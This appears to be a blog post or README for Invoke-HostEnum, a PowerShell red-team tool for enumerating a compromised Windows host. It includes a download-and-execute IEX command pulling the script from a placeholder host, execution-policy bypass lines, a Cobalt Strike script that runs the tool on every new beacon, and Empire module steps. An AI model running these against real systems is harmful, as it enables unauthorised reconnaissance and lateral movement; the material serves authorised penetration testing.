# HostEnum - A PowerShell Host Situational Awareness Tool

## Overview

During a Red Team engagement, performing detailed Situational Awareness (SA) or enumeration on initial and subsequent host compromises is vital. Every good pen-tester or red teamer has their list of go-to scripts, commands, or "pasties" to run once initial shell access is achieved. The goal is to quickly learn as much about your environment as possible; including defenses, system configuration, interesting files, and opportunities for persistence and lateral movement. Moreover, when working in large and/or distributed teams, a common tool-base and procedure set is crucial to ensure that necessary enumeration is accomplished no matter who's behind the keyboard.

The first shell is often achieved on a host running the Microsoft Windows Operating System after a phishing/social-engineering attack or Web Application exploit. This makes PowerShell an excellent choice for automating post-exploitation and SA tasks. **Invoke-HostEnum** is a PowerShell 2.0 compatible enumeration script intended to be executed through a remote access capability such as Cobalt Strike's Beacon, Empire, or even a web-shell. All output is pre-formatted into Tables or Lists and converted to a string before returning results for this reason. Earlier internal versions of the script contained many more privilege escalation checks, but the continued development and robustness of [PowerUp][1] made these mostly redundant.

There are several good examples of PowerShell host enumeration tools including[ HostRecon][2] by Beau Bullock and [Invoke-WinEnum][3] in PowerShell Empire. Invoke-HostEnum borrows functions from these and other modules annotated throughout its source. There was a similarly named Invoke-HostEnum function in PowerView that was [removed][4] in 2015, but this is not a resurrected version.

I've started to remove many (but not all) binary dependencies to avoid triggering potential alerts from running numerous common built-in Windows command-line enumeration tools in rapid succession. However, there is always room for improvement and contributions and suggestions to the Github repository are highly encouraged!

## Features

The following is a comprehensive list of the items currently enumerated by Invoke-HostEnum. Some enumerations functions require local administrator rights for best results and will result in no or limited results when run under a limited user context.

- OS Details, Hostname, Uptime, Installdate, Architecture
- Installed Applications and Patches
- Network Adapter Configuration, Network Shares, Connections, Routing Table, DNS Cache
- Running Processes (with full command line) and Installed Services
- Interesting Registry Entries (SNMP strings, Saved Putty Sessions)
- Local Users, Groups, and Administrators
- Personal Security Product Status
- Interesting file locations (Current User Profile) and keyword searches via file indexing
- Recycle Bin Contents
- Interesting Windows Logs (Get-ComputerDetails – Logon Events, AppLocker logs, PowerShell logs, RDP servers)
- Basic Domain enumeration (users, groups, trusts, domain controllers, account policy, SPNs)-Explicit Credential Logons (Event ID 4648)

As usual, you can get the latest version of tools on our GitHub repository.

## Usage

### Command Line

Execute locally hosted script with console output

```
powershell -ep bypass -c Import-Module ./Invoke-HostEnum.ps1; Invoke-HostEnum -Local -Domain
```

Download and execute remotely hosted script

```
powershell -nop -c IEX (New-Object Net.Webclient).downloadstring("""http://yourdomain/Invoke-HostEnum.ps1""");Invoke-HostEnum -Local
```

Execute locally hosted script with HTML report output. If you want the mostly easily readable format and don't mind writing a file to disk, consider using the "-Path" option to specify a directory for an HTML formatted report

```
powershell -ep bypass -c Import-Module ./Invoke-HostEnum.ps1; Invoke-HostEnum -Local -Path c:programdata
```

### Cobalt Strike

Import script and execute interactively in a Beacon console

```
powershell-import ./scripts/Invoke-HostEnum.ps1
powershell Invoke-HostEnum -Local -Domain
```

Automatic execution – Use [aggressor][6] script to fire upon new beacon arrivals. This is ideal to implement on your initial interactive/phishing callback Team Server where you want to gather information in the target environment and may be away from the console. Consider combining with a Slack notification script as described in our previous post [Slack Notifications for Cobalt Strike ][7]or as thoroughly explained by Jeff Dimmock in [Slack Bots for Trolls and Work][8]. **Note:** This code would require slight modification to work for DNS beacons if desired.

```bash
on beacon_initial {
    enumerate($1);
}

sub enumerate {
    if ( -exists script_resource("scripts/Invoke-HostEnum.ps1")) {
    binput($1,"[*] Executing Invoke-HostEnum");
    bpowershell_import($1, script_resource("scripts/Invoke-HostEnum.ps1"));
    bpowershell($1, "Invoke-HostEnum -Local -Domain");
    }
    else {
    berror($1, "Invoke-HostEnum.ps1 does not exist");
    }
}
```

### **PowerShell Empire**

I've also created a basic post-exploitation module for Empire (hostenum.py) that makes executing on an Empire agent extremely easy.

Copy scripts to the appropriate Empire path

```
cp Invoke-HostEnum.ps1 /data/module_source/situational_awareness/host
cp hostenum.py /lib/modules/situational_awareness/host
```

Start Empire

```
# ./empire
```

Interact with agent

```
(Empire) > interact
```

Execute the module

```
(Empire: BX1HBE3MZAWGF1BB) > usemodule situational_awareness/host/hostenum
(Empire: situational_awareness/host/hostenum) > run
```
